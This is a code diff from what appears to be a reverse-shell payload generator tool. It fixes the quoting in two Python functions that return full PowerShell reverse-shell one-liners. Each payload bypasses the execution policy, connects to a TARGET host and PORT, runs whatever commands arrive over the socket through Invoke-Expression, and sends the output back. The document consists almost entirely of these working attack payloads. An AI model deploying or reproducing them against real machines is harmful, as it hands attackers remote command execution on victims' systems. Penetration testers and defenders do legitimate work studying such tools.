@@ -36,7 +36,7 @@ def BASH_TCP():
 
 
 def REV_POWERSHELL_TCP():
-    return """powershell.exe -nop -ep bypass -Command '$VAR1=\\"TARGET\\";$VAR2=PORT;$VAR3=New-Object System.Net.Sockets.TCPClient($VAR1,$VAR2);$VAR4=$VAR3.GetStream();[byte[]]$VAR5=0..65535|%{0};$VAR6=([text.encoding]::ASCII).GetBytes(\\"PS \\"+(Get-Location).Path+\\"> \\");$VAR4.Write($VAR6,0,$VAR6.Length);while(($VAR7=$VAR4.Read($VAR5,0,$VAR5.Length)) -ne 0){$VAR8=([text.encoding]::ASCII).GetString($VAR5,0,$VAR7);try{$VAR9=(Invoke-Expression -c $VAR8 2>&1|Out-String)}catch{Write-Warning \\"Something went wrong with execution of command on the target.\\";Write-Error $_;};$VAR10=$VAR9+\\"PS \\"+(Get-Location).Path+\\"> \\";$VAR11=($VAR12[0]|Out-String);$VAR12.clear();$VAR10=$VAR10+$VAR11;$VAR6=([text.encoding]::ASCII).GetBytes($VAR10);$VAR4.Write($VAR6,0,$VAR6.Length);$VAR4.Flush();};$VAR3.Close();if($VAR13){$VAR13.Stop();};'"""
+    return """powershell.exe -nop -ep bypass -Command "$VAR1='TARGET';$VAR2=PORT;$VAR3=New-Object System.Net.Sockets.TCPClient($VAR1,$VAR2);$VAR4=$VAR3.GetStream();[byte[]]$VAR5=0..65535|%{0};$VAR6=([text.encoding]::ASCII).GetBytes('PS '+(Get-Location).Path+'> ');$VAR4.Write($VAR6,0,$VAR6.Length);while(($VAR7=$VAR4.Read($VAR5,0,$VAR5.Length)) -ne 0){$VAR8=([text.encoding]::ASCII).GetString($VAR5,0,$VAR7);try{$VAR9=(Invoke-Expression -c $VAR8 2>&1|Out-String)}catch{Write-Warning 'Something went wrong with execution of command on the target.';Write-Error $_;};$VAR10=$VAR9+'PS '+(Get-Location).Path+'> ';$VAR11=($VAR12[0]|Out-String);$VAR12.clear();$VAR10=$VAR10+$VAR11;$VAR6=([text.encoding]::ASCII).GetBytes($VAR10);$VAR4.Write($VAR6,0,$VAR6.Length);$VAR4.Flush();};$VAR3.Close();if($VAR13){$VAR13.Stop();};" """
 
 
 def REVERSE_TCLSH():
@@ -100,7 +100,7 @@ def REVERSE_WINDOWS_BLOODSEEKER_TCP():
 
 
 def REVERSE_POWERSHELL_TINY_TCP():
-    return """powershell.exe -nop -ep bypass -Command '$VAR1=new-object system.net.sockets.tcpclient(\\"TARGET\\",PORT);$VAR2=$VAR1.GetStream();[byte[]]$VAR3=0..65535|%{0};while(($VAR4=$VAR2.Read($VAR3,0,$VAR3.Length)) -ne 0){;$VAR5=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($VAR3,0,$VAR4);$VAR6=(iex $VAR5 2>&1|out-string);$VAR8=$VAR6+\\"PS \\"+(pwd).Path+\\">\\";$VAR7=([text.encoding]::ASCII).GetBytes($VAR8);$VAR2.Write($VAR7,0,$VAR7.Length);$VAR2.Flush};$VAR1.close()'"""
+    return """powershell.exe -nop -ep bypass -Command "$VAR1=new-object system.net.sockets.tcpclient('TARGET',PORT);$VAR2=$VAR1.GetStream();[byte[]]$VAR3=0..65535|%{0};while(($VAR4=$VAR2.Read($VAR3,0,$VAR3.Length)) -ne 0){;$VAR5=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($VAR3,0,$VAR4);$VAR6=(iex $VAR5 2>&1|out-string);$VAR8=$VAR6+'PS '+(pwd).Path+'>';$VAR7=([text.encoding]::ASCII).GetBytes($VAR8);$VAR2.Write($VAR7,0,$VAR7.Length);$VAR2.Flush};$VAR1.close()" """
 
 
 def REVERSE_POWERSHELL_NISHANG_TCP():
